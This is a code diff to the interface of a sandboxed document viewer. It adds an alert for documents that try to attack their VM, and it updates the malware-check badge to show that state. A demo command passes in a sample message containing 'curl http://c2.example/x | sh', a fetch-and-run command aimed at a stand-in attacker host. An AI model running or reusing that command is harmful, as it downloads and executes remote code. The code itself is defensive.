@@ -79,6 +79,13 @@ async function openWith(promise, label) {
     status(`${info.pages.length} page(s) · VM ready in ${(info.ready_ms / 1000).toFixed(1)}s · opened in ${secs}s${more}`);
   } catch (e) {
     resetDocument();
+    // Attacked while opening: the red alert, and the full check runs anyway.
+    if (String(e).startsWith("the document attacked its VM")) {
+      attackBlocked(e);
+      $("seal").classList.remove("stopped");
+      if (autoCheckOn()) startCheck();
+      return;
+    }
     status(`Could not open: ${e}`, true);
     // The file was read but cannot be shown: it can still be analyzed.
     const name = await invoke("chosen_name").catch(() => null);
@@ -412,7 +419,38 @@ async function runSearch() {
 
 // The document's VM is gone (it stopped, or was shut down as hostile):
 // say so plainly and offer a fresh one. Why is in ~/.local/state/airlock/app.log.
+// The tripwire: the document tried to run a program, use the network or
+// attack the system from inside its VM, which was destroyed at once.
+function attackBlocked(e) {
+  const msg = String(e);
+  if (!msg.startsWith("the document attacked its VM")) return false;
+  check.attacked = true;
+  check.attackMsg = msg;
+  showCheck();
+  const what = msg.replace(/^the document attacked its VM: /, "").replace(/ \(blocked; the VM was destroyed at once\)$/, "");
+  status("Attack blocked: the document's VM was destroyed", true);
+  $("seal").classList.add("stopped");
+  $("seal").querySelector(".label").textContent = "VM destroyed · attack blocked";
+  const body = openPanel("Attack blocked");
+  const v = el("div", "verdict malicious");
+  v.append(el("div", "label", "ATTACK BLOCKED"), el("h3", "", "This document tried to attack your computer"));
+  const advice = el("div", "advice");
+  advice.append(el("strong", "", "What happened"), el("p", "", "While it was being shown, the document tried to do something no document needs to do. airlock blocked it and destroyed the document's VM at once, so it got no second try. Nothing reached your computer."));
+  advice.append(el("strong", "", "What to do"), el("p", "", "Do not open the original in any other program. Delete it, and if it came by email, report it as phishing. The pages already shown are only pictures and are safe to look at."));
+  v.append(advice);
+  const tech = el("details", "");
+  tech.append(el("summary", "", "Technical details"), el("pre", "", what));
+  body.replaceChildren(v, tech);
+  const go = el("button", "", "Full analysis…");
+  go.onclick = () => showAnalysis();
+  body.append(go);
+  return true;
+}
+
 function vmStopped(e) {
+  if (attackBlocked(e)) return true;
+  // After the tripwire, the other requests in flight fail too: already explained.
+  if (check.attacked) return true;
   const msg = String(e);
   const stopped = msg.startsWith("the document's VM stopped");
   const hostile = msg.startsWith("protocol violation");
@@ -568,7 +606,7 @@ function renderReport(body, report, title) {
 
 // The malware check (the same one whether automatic or from Analyze): one
 // run per opened file, shared by the badge, the Analyze button and the panel.
-const check = { gen: 0, running: null, report: null, error: null };
+const check = { gen: 0, running: null, report: null, error: null, attacked: false };
 
 function autoCheckOn() { return pref("airlock.autoCheck", "1") === "1"; }
 
@@ -578,7 +616,9 @@ function verdictClass(v) {
 
 function showCheck() {
   const b = $("check");
-  const [cls, label, title] = check.running
+  const [cls, label, title] = check.attacked
+    ? ["malicious", "Attack blocked", "This document tried to attack your computer while it was shown; its VM was destroyed at once. Click for details."]
+    : check.running
     ? ["checking", "Checking…", "Checking this file for malware in two separate microVMs (one wired to a fake internet). Keep reading meanwhile. Click to watch."]
     : check.report
       ? [verdictClass(check.report.verdict), { malicious: /LIKELY/.test(check.report.verdict) ? "Likely malicious" : "Malicious", suspicious: "Suspicious", clean: "No threats found" }[verdictClass(check.report.verdict)], `${check.report.headline || check.report.verdict}. Click for the full report.`]
@@ -594,7 +634,7 @@ function showCheck() {
 }
 
 function clearCheck() {
-  Object.assign(check, { gen: check.gen + 1, running: null, report: null, error: null });
+  Object.assign(check, { gen: check.gen + 1, running: null, report: null, error: null, attacked: false });
   showCheck();
 }
 
@@ -662,7 +702,7 @@ function analyze(name) {
   return showAnalysis(name);
 }
 
-$("check").onclick = () => showAnalysis();
+$("check").onclick = () => (check.attacked ? attackBlocked(check.attackMsg) : showAnalysis());
 
 // ---------------------------------------------------------------- wiring
 
@@ -920,6 +960,7 @@ async function runDemo() {
       document.elementFromPoint(x, y).dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
     }
     if (cmd === "click") $(arg).click();
+    if (cmd === "tripwire") vmStopped("the document attacked its VM: /bin/sh [/bin/sh -c curl http://c2.example/x | sh] (blocked; the VM was destroyed at once)");
     if (cmd === "sheets") { setPref("airlock.sheetSingle", arg === "single" ? "1" : "0"); showSheetLayout(); await invoke("set_sheet_layout", { single: arg === "single" }); await reopenDocument(); }
     if (cmd === "tour") { startTour(); tourShow(Number(arg) || 0); }
     if (cmd === "wait") await new Promise((r) => setTimeout(r, Number(arg) || 0));
